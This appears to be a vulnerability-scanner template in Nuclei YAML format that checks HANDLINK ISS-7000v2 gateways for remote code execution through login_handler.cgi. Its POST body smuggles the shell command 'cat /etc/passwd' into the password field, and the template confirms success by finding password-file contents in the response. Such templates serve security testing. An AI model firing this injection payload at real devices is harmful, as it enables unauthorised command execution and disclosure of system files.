id: handlink-iss-7000v2-gateway-login-handler-cgi-rce
info:
  name: HANDLINK-ISS-7000v2 Gateway Remote Code Execution
  author: ProjectDiscoveryAI
  severity: critical
  tags: rce
  description: |
    HANDLINK-ISS-7000v2 Gateway is vulnerable to a Remote Code Execution (RCE) attack via the login_handler.cgi endpoint.

http:
  - method: POST
    path:
      - "{{BaseURL}}/login_handler.cgi"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      username=admin&password=admin|cat /etc/passwd&uilng=3&button=%E7%99%BB%E5%85%A5&Signin=

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "root:"
      - type: word
        part: header
        words:
          - "/bin"
      - type: word
        part: header
        words:
          - "ISS-7000 v2"
